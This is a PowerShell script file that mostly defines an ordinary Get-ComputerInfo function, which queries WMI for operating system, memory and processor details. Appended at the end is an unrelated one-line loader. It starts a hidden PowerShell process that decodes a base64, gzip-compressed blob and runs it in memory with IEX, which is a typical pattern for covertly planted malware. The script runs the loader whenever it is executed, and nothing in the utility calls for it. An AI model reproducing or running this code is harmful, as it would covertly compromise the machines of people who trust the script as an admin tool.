﻿

function Get-ComputerInfo
{



 [CmdletBinding()]

    PARAM(
    [Parameter(ValueFromPipeline=$true)]
    [String[]]$ComputerName = "LocalHost",

    [String]$ErrorLog = ".\Errors.log",

    [Alias("RunAs")]
    [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty
    )

    BEGIN {}

    PROCESS{
        FOREACH ($Computer in $ComputerName) {
            Write-Verbose -Message "PROCESS - Querying $Computer ..."

            TRY{
                $Splatting = @{
                    ComputerName = $Computer
                }

                IF ($PSBoundParameters["Credential"]){
                    $Splatting.Credential = $Credential
                }


                $Everything_is_OK = $true
                Write-Verbose -Message "PROCESS - $Computer - Testing Connection"
                Test-Connection -Count 1 -ComputerName $Computer -ErrorAction Stop -ErrorVariable ProcessError | Out-Null

                
                Write-Verbose -Message "PROCESS - $Computer - WMI:Win32_OperatingSystem"
                $OperatingSystem = Get-WmiObject -Class Win32_OperatingSystem @Splatting -ErrorAction Stop -ErrorVariable ProcessError

                
                Write-Verbose -Message "PROCESS - $Computer - WMI:Win32_ComputerSystem"
                $ComputerSystem = Get-WmiObject -Class win32_ComputerSystem @Splatting -ErrorAction Stop -ErrorVariable ProcessError

                
                Write-Verbose -Message "PROCESS - $Computer - WMI:Win32_Processor"
                $Processors = Get-WmiObject -Class win32_Processor @Splatting -ErrorAction Stop -ErrorVariable ProcessError

                
                
                
                Write-Verbose -Message "PROCESS - $Computer - Determine the number of Socket(s)/Core(s)"
                $Cores = 0
                $Sockets = 0
                FOREACH ($Proc in $Processors){
                    IF($Proc.numberofcores -eq $null){
                        IF ($Proc.SocketDesignation -ne $null){$Sockets++}
                        $Cores++
                    }ELSE {
                        $Sockets++
                        $Cores += $proc.numberofcores
                    }
                }

            }CATCH{
                $Everything_is_OK = $false
                Write-Warning -Message "Error on $Computer"
                $Computer | Out-file -FilePath $ErrorLog -Append -ErrorAction Continue
                $ProcessError | Out-file -FilePath $ErrorLog -Append -ErrorAction Continue
                Write-Warning -Message "Logged in $ErrorLog"

            }


            IF ($Everything_is_OK){
                Write-Verbose -Message "PROCESS - $Computer - Building the Output Information"
                $Info = [ordered]@{
                    "ComputerName" = $OperatingSystem.__Server;
                    "OSName" = $OperatingSystem.Caption;
                    "OSVersion" = $OperatingSystem.version;
                    "MemoryGB" = $ComputerSystem.TotalPhysicalMemory/1GB -as [int];
                    "NumberOfProcessors" = $ComputerSystem.NumberOfProcessors;
                    "NumberOfSockets" = $Sockets;
                    "NumberOfCores" = $Cores}

                $output = New-Object -TypeName PSObject -Property $Info
                $output
            } 
        }
    }
    END{
        
        Write-Verbose -Message "END - Cleanup Variables"
        Remove-Variable -Name output,info,ProcessError,Sockets,Cores,OperatingSystem,ComputerSystem,Processors,
        ComputerName, ComputerName, Computer, Everything_is_OK -ErrorAction SilentlyContinue

        
        Write-Verbose -Message "END - Script End !"
    }
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIADswgFgCA71WbW/aSBD+nEr9D1aFhK0SDAlt0kiVbm1eEyCAwQQoqrb22l6y9hJ7TTC9/vcbg53Sl5xyd9JZidj1zOw++8wzO3biwBKUB9LDxtLdqdcaz6Wvr1+dDHCIfUku+BOtii5aqCQVgthXTk7AVmBjg7U+exfSR0leoPW6zn1Mg+XVlR6HIQnEYV5uEYGiiPhfGCWRrEh/SlOPhOT09suKWEL6KhU+l1uMf8Esc0t0bHlEOkWBndq63MIptrKxZlTIxU+fisritLosNx5izCK5aCSRIH7ZZqyoSN+UdMNxsiZysUetkEfcEeUpDc7PypMgwg7pw2ob0iPC43ZUVOAk8BcSEYeB9HSmdJGDi1yE4SDkFrLtkEQQUe4EG35PZKCCsZL0h7zIEIziQFCfgF2QkK8NEm6oRaJyGwc2IyPiLOU+ecwP/tIg+TgIvAYiVEqQk2eg9rgdM3KILiq/gn3KpQJPlk8g4dvrV69fObkMwnd469+0ybEIYHSy2I8JIJUHPKJ7349SpST1YD8seJjAtDAOY6IspUWahcVyKRVE8ljttWbnM7/0/CrVPAQC3OTmclSrdDfwfmFyai8hLktVYXWR7Mi2v1t5ndT8vPLqxKEBqScB9qmVi0v+XQ6Iw8j+5OXcrQ8A5WJmIHadMOJikTJakha/hjV8Kp5itZgym4TIgjxGgApSrPwI5pAkudgJesQH1g7zIqTDAUmT3DuTcZLvns7BqagzHEUlaRBDTVklySCYEbskoSCimQnFgu+Hxe9wezET1MKRyJdbKj/RmW2r8yASYWxBPoGCsbEmFsUsZaQktalNtMSgbr598bd86JgxGriw0gbyAW9SHgyRqiQEpEeKUMoGER1/zYgPnvtKbzLsQl1nlbEXF3aJXXwGbi7+g9JTfnJijsBC0g3GRUkyaSjg3ki5flLZfwF0dHkcQ9NDkiVMzqtroSUirYeCtQtG/Na9nIxcPVVwRt+erFAAUc2Q+xqOyPuaIUKgUX6j3lIdwTPrBKxnafe0ih5ptdOD/wk97/D6hX1zvWqrYX3rOagTdXrtQX3Ybtc214ZZE0ajI24GHdFr3K1WBmqPJjMx76D2mFbuZ7Xd+prujC6yZ1v1/U7bPVa07W7l2s6s7jjuhWOMqu+atDvVh1rlDHfrjbg71R61Si1q0Mf2kE6G99dN8WVmMjxxVPeu+gHTbTdcmVXe23UQannn1u7aMVtez05mbfXDtHaPGgjpQcNsavxmpoVooJrYNfm0lmzeT10daU2Lkvlw0tSGw6aGJq3VQ/2D6kLsHfa0qXlG5+u7kQfzJkC4USu1jk12fDYEklocYXcEPq5+ZnkO+NTfIu1tn0dn+F7jSAOf5vwBcM3WzQED+3hyxpHJ+ncYdedJU1Wrs0ENtSt02nJRuiR2tSFG0aa+q6tV0+b29F1/5qjmHbtQ6/p4bTmqqj626zfWvLq9vL247E6p6XM0UVXzTSoT0EmBbFrJg3OU8efu/h4OIw8zUAJc6Hm1NnnYzO7nAadphCwftet7EgaEQZeDPpiLHDHGrbRZPN3n0KwOLWQJZTuB4fnZb0eK9OSofG8i+aurqznghao5VnK5SwJXeKXK9rxSgZZQ2dYqcPKXn1Xn60T+YclS2loy2n7eje13U9LCKgSattP/D16zqvbgx34Jr9/f/Y31RVxXSjkPvxh+fPGPKP+XNEwxFeBvwNXEyKGVPs9GJqjjT5E0XaATJ3vSb8LbWJz24RPlL9ZbtVuKCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

